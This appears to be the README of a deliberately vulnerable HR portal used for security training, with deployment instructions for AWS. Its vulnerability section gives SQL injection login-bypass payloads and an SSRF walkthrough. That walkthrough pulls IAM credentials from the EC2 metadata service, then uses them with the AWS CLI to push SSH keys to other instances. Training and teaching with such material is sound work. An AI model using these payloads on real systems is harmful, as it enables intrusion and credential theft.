## üìã Application Purpose

This HR application serves as a hands-on training tool for:

- Cybersecurity professionals learning to identify vulnerabilities
- Developers learning secure coding practices
- Security teams practicing penetration testing techniques
- Educational institutions teaching application security

By deliberately implementing common vulnerabilities, this application provides a safe environment to practice identifying, exploiting, and remediating security issues without impacting real systems.

## üîç Application Overview

This HR application simulates a typical enterprise human resources system with the following features:

- User authentication and management
- Employee profile management with sensitive personal data
- Document upload and management
- Leave request system
- Organization hierarchy visualization
- Role-based access control (employee, manager, HR)
- New employee onboarding wizard
- PDF generation of employee data

## üõ°Ô∏è Security Vulnerabilities

This application has been deliberately designed with the following vulnerabilities:

### 1. SQL Injection (SQLi)

The login functionality is vulnerable to SQL injection:

```javascript
// Example vulnerable code
console.log(`SELECT * FROM users WHERE username='${username}' AND password='${password}'`);
```

#### Exploitation Step-by-Step:

1. Navigate to the login page
2. In the username field, enter one of the following:
   - `' OR '1'='1` (with anything as password)
   - `admin'--` (with anything as password)
   - `john' OR 1=1--` (with anything as password)

3. Click the "Log In" button

**What happens:**
- The first payload creates a query: `SELECT * FROM users WHERE username='' OR '1'='1' AND password='anything'`
- Since `'1'='1'` is always true, this returns all users and logs in as the first user
- The second payload creates a query: `SELECT * FROM users WHERE username='admin'-- AND password='anything'`
- The `--` comments out the password check entirely, logging you in as admin
- The third example similarly bypasses authentication with a variation of the technique

**Mitigation (for learning):** Use parameterized queries or prepared statements instead of string concatenation.

### 2. Server-Side Request Forgery (SSRF)

The file upload system is vulnerable to SSRF:

```javascript
// Example vulnerable endpoint
console.log(`/api/upload?url=s3://employee-bucket/${currentUser?.id}/${file.name}`);
```

#### Exploitation Step-by-Step:

1. Log in to the application
2. Navigate to the document upload page
3. Select a file to upload
4. Intercept the request with a proxy tool like Burp Suite
5. Modify the URL parameter to point to internal resources:
   ```
   /api/upload?url=http://169.254.169.254/latest/meta-data/
   ```
6. Observe the response which reveals EC2 metadata

#### Exploiting SSRF to Connect to Other EC2 Instances

After exploiting the SSRF vulnerability, you can use the EC2 instance's IAM role to connect to other EC2 instances:

1. **Access the EC2 Instance Metadata Service**:
   ```
   /api/upload?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role
   ```
   This will return temporary AWS credentials (access key, secret key, token).

2. **Use AWS CLI with the stolen credentials**:
   ```bash
   export AWS_ACCESS_KEY_ID=ASIA...
   export AWS_SECRET_ACCESS_KEY=stolen_secret_key
   export AWS_SESSION_TOKEN=stolen_session_token
   ```

3. **List other EC2 instances**:
   ```bash
   aws ec2 describe-instances --region us-east-1
   ```

4. **Connect to another instance using EC2 Instance Connect**:
   ```bash
   # Generate a temporary SSH key
   ssh-keygen -t rsa -f /tmp/temp_key -N ""
   
   # Push the public key to the target EC2 instance
   aws ec2-instance-connect send-ssh-public-key \
     --region us-east-1 \
     --instance-id i-target-instance-id \
     --availability-zone target-az \
     --instance-os-user ec2-user \
     --ssh-public-key file:///tmp/temp_key.pub
   
   # Connect using the private key
   ssh -i /tmp/temp_key ec2-user@target-instance-ip
   ```

This attack works because the EC2 instance has been granted IAM permissions to connect to other instances without requiring additional credentials.

### 3. Insecure File Upload

The application allows unrestricted file uploads:

```javascript
// No validation on file uploads
const handleFileUpload = (e) => {
  const file = e.target.files[0];
  if (file) {
    // No validation for file type, size, or content
    console.log(`Uploading file: ${file.name} without any validation`);
  }
};
```

**Exploitation Examples:**
- Upload malicious PHP files that could be executed by the server
- Upload extremely large files to cause denial of service
- Upload files with embedded malicious scripts

---

### 4. Sensitive Data Exposure

The application displays and processes sensitive information without proper protection:

- Social Security Numbers
- Bank account details
- Salary information
- Personal identifying information

---

### 5. Insecure Infrastructure Configuration

The application is designed to be deployed with:
- Hardcoded credentials in YAML files for RDS access
- Insecure S3 bucket configurations
- Unprotected EC2 instances
- Exposed secrets in GitHub Actions configuration

---

## üîë Authentication Information

For testing purposes, you can use the following credentials:

- Regular Employee: Username `john`, any password (or SQL injection)
- Manager: Username `jane`, any password (or SQL injection)
- HR Admin: Username `admin`, any password (or SQL injection)

To register a new account, use company code: `WelcomeAboard`

---

## üèóÔ∏è Deployment Architecture (Security Training)

For training purposes, the application is designed to be deployed as:

1. A microservices application using API Gateway
2. Single EC2 instance (not ECS)
3. RDS database with credentials in YAML file
4. S3 bucket for static file storage
5. Deployment using GitHub Actions with Terraform

---

## üöÄ Deployment Using GitHub

To deploy this application using GitHub and AWS, follow these steps:

### Prerequisites
1. **AWS Account**: You need an AWS account with appropriate permissions
2. **GitHub Account**: A GitHub account to host the repository
3. **Terraform**: The infrastructure is managed using Terraform

### Step 1: Fork or Clone the Repository
1. Fork this repository to your GitHub account
2. Clone it to your local machine:
   ```bash
   git clone https://github.com/YOUR-USERNAME/hr-portal-simulator.git
   cd hr-portal-simulator
   ```

### Step 2: Configure GitHub Secrets
Add these secrets in your GitHub repository (Settings ‚Üí Secrets and variables ‚Üí Actions):

- `AWS_ACCESS_KEY_ID`: Your AWS access key ID
- `AWS_SECRET_ACCESS_KEY`: Your AWS secret access key
- `AWS_REGION`: Your preferred AWS region (e.g., `us-east-1`)
- `DB_USERNAME`: Username for the RDS instance
- `DB_PASSWORD`: Password for the RDS instance
- `SSH_PRIVATE_KEY`: A private SSH key for connecting to EC2 instances

### Step 3: Create SSH Key Pair
1. Generate a new SSH key pair:
   ```bash
   ssh-keygen -t rsa -b 4096 -f hr_portal_key -N ""
   ```
2. Upload the public key to AWS:
   ```bash
   aws ec2 import-key-pair --key-name hr-portal-key \
     --public-key-material fileb://hr_portal_key.pub
   ```
3. Store the private key content as `SSH_PRIVATE_KEY` in GitHub Secrets

### Step 4: Update Terraform Variables
1. Modify `terraform/variables.tf` to match your environment if needed
2. Ensure the `key_pair_name` variable matches your imported key pair name

### Step 5: Trigger Deployment
1. Commit and push your changes to the main branch:
   ```bash
   git add .
   git commit -m "Prepare for deployment"
   git push origin main
   ```
2. The GitHub Actions workflow will automatically trigger deployment
3. Monitor the workflow progress in the Actions tab of your GitHub repository

### Step 6: Access Your Application
1. After successful deployment, find the EC2 public IP in the workflow output
2. Access the application at `http://[EC2-PUBLIC-IP]`

### Step 7: Cleanup
To avoid unexpected charges, remember to destroy resources when done:
1. Run manually in the Actions tab by selecting the workflow and clicking "Run workflow"
2. Choose the "Terraform Destroy" option

### Troubleshooting
- Check CloudWatch Logs if the application isn't working
- Verify security group rules if you can't connect to the resources
- Ensure all required secrets are properly configured
